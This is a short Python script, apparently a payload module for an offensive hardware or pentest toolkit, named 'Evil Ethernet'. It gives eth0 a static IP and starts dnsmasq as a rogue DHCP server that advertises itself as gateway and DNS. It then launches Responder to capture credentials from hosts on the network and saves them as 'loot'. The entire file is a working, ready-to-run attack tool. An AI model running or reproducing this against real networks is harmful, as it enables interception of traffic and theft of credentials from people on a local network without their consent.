#!/usr/bin/env python3
# neo-name: Evil Ethernet
# neo-desc: Rogue DHCP + Responder (requires eth0)
# neo-icon: network

import os
import subprocess
import time
import sys
import signal

IFACE = "eth0"
STATIC_IP = "192.168.100.1"
LOOT_DIR = os.path.expanduser("~/neo/loot/captures/responder")

def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def cleanup(dns_proc):
    print("\n[*] Cleaning up...")
    if dns_proc:
        dns_proc.terminate()
    run_cmd(f"sudo ip addr del {STATIC_IP}/24 dev {IFACE} 2>/dev/null")
    run_cmd(f"sudo ip link set {IFACE} down")
    run_cmd("sudo systemctl start dnsmasq") # Restore original if any

def main():
    print(f"--- Evil Ethernet starting on {IFACE} ---")

    # 1. Check if interface exists
    if not os.path.exists(f"/sys/class/net/{IFACE}"):
        print(f"[!] Error: {IFACE} not found.")
        return

    # 1b. Honest dependency checks — fail fast with a fix instead of crashing
    #     mid-attack. dnsmasq is on apt; Responder is a third-party tool we
    #     don't auto-clone (it's a credential capturer; user opts in).
    if subprocess.run(["which", "dnsmasq"], capture_output=True).returncode != 0:
        print("[!] dnsmasq not installed.")
        print("    Fix:  sudo apt install -y dnsmasq")
        return
    if not os.path.isdir("/opt/responder"):
        print("[!] Responder not found at /opt/responder.")
        print("    Fix:  sudo git clone https://github.com/lgandx/Responder /opt/responder")
        return

    # 2. Setup static IP
    print(f"[*] Configuring {IFACE} with {STATIC_IP}...")
    run_cmd(f"sudo ip addr add {STATIC_IP}/24 dev {IFACE}")
    run_cmd(f"sudo ip link set {IFACE} up")

    # 3. Start dnsmasq (Rogue DHCP)
    print("[*] Starting dnsmasq (DHCP)...")
    dnsmasq_conf = f"""
interface={IFACE}
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=option:router,{STATIC_IP}
dhcp-option=option:dns-server,{STATIC_IP}
    """
    with open("/tmp/evil_dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    # Stop any existing dnsmasq
    run_cmd("sudo systemctl stop dnsmasq")
    dns_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/evil_dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 4. Start Responder
    print("[*] Starting Responder...")
    print(f"[*] Loot will be saved in {LOOT_DIR}")
    
    # Move to Responder dir to ensure it finds its configs
    os.chdir("/opt/responder")
    
    responder_cmd = [
        "sudo", "python3", "Responder.py",
        "-I", IFACE,
        "-d", "-w", "-v"
    ]
    
    try:
        subprocess.run(responder_cmd)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup(dns_proc)

if __name__ == "__main__":
    main()
